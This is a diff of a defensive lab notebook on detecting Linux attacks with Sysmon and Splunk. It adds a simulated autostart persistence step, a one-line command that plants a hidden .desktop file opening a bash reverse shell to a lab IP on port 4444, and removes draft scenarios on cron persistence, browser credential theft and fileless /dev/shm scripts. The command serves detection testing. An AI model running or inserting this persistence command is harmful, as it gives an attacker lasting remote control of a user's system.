@@ -259,61 +259,15 @@ input: Hak5 USB Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1.2/1-1.
 hid-generic ****:****.0001: input,hidrawX: USB HID v1.11 Keyboard [Hak5 USB Keyboard] on usb-0000:00:14.0-1.2/input0
 ~~~
 
-### Test "Persistence Backdoor" Scenario
-🌱 develop or cancel scenario
+### Test "Desktop Entry Persistence" Scenario
+The "Fake Icon" trick takes advantage of a feature of the Desktop version. Any .desktop file placed in `~/.config/autostart/` is run automatically when the user logs into the GUI.
 
-Attackers want to make sure they stay on the system even after a reboot. Adding a scheduled task/execution ensures access survives a reboot.
+- Attack simulation:
+  - `mkdir -p ~/.config/autostart/ && echo -e "[Desktop Entry]\nType=Application\nExec=bash -c 'bash -i >& /dev/tcp/192.168.99.220/4444 0>&1'\nHidden=true\nName=SystemUpdate" > ~/.config/autostart/update.desktop`
 
-The Action: A script adds a line to /etc/crontab or a file in /etc/cron.d/ that beacons back to a server every hour.
+- Detection:
+~~~
+index=main sourcetype="sysmon:linux" EventID=11 TargetFilename="*/.config/autostart/*"
+| table _time, host, user, TargetFilename, Image
+~~~
 
-The "Aha!" Moment: Monitor for EventID 11 (FileCreate) targeting the /etc/cron* directories.
-
-sourcetype="sysmon:linux" EventID=11 | search TargetFilename="/etc/systemd/system/*.service" | table _time, User, Image, TargetFilename
-
-The Search: index=main sourcetype="sysmon:linux" EventID=11 TargetFilename="/etc/cron*"
-
-### Test "Reverse Shell" Scenario
-🌱 develop or cancel scenario
-
-If the human wants a "callback" every time the system starts, they might add a line to the /etc/crontab or create a script in /etc/cron.hourly/.
-
-The Sysmon Search for Cron Manipulation: index=main sourcetype="sysmon:linux" EventID=11 | search TargetFilename="/etc/cron*" OR TargetFilename="/var/spool/cron/*" | table _time, User, Image, TargetFilename
-
-### Test "Active Reverse Shell Detection" Scenario
-🌱 develop or cancel scenario
-
-Once the persistence is set up, the user will likely test the connection. This generates a Network Connection (EventID 3). We want to find a shell (bash/sh) that is talking to an external IP address.
-
-The "Shell-to-Network" Correlation: index=main sourcetype="sysmon:linux" EventID=3 | search Image="*/bash" OR Image="*/sh" OR Image="*/python*" | table _time, User, Image, SourceIp, DestinationIp, DestinationPort
-
-The Smoking Gun: A normal bash process does not talk to the network. If you see bash connecting to a remote port like 4444, 8080, or 1337, you have caught an active reverse shell.
-
-### Test "Browser Credential Theft" Scenario
-🌱 develop or cancel scenario
-
-Browser Credential Theft (Data Exfiltration)
-Attackers often target the browser's "Login Data" database to steal saved passwords.
-
-The Action: A process like cp or cat accesses the SQLite database in ~/.config/google-chrome/Default/Login Data.
-
-The "Aha!" Moment: Using EventID 23 (FileDelete) or general process monitoring to see non-browser processes touching the Chrome/Firefox profile folders.
-
-### Test "Malicious Browser Extension" Scenario
-🌱 develop or cancel scenario
-
-Malicious Browser Extension (Living Off the Browser)
-A subtle scenario where an extension executes system commands.
-
-The Action: An extension uses a "Native Messaging" host to run a bash script on the desktop.
-
-The "Aha!" Moment: In your EventID 1 results, look for ParentImage pointing to the Google Chrome or Firefox binary, but spawning /usr/bin/python or /usr/bin/bash.
-
-### Test "Shared Memory Secret Sniffing" Scenario
-🌱 develop or cancel scenario
-
-Shared Memory Secret Sniffing (Memory Forensics)
-Linux uses /dev/shm for shared memory. Attackers sometimes use this for "fileless" malware.
-
-The Action: A script creates a hidden executable directly in memory (/dev/shm/.hidden_script) to avoid being caught by traditional disk scans.
-
-The "Aha!" Moment: Watch for EventID 11 or EventID 1 where the path starts with /dev/shm or /tmp.
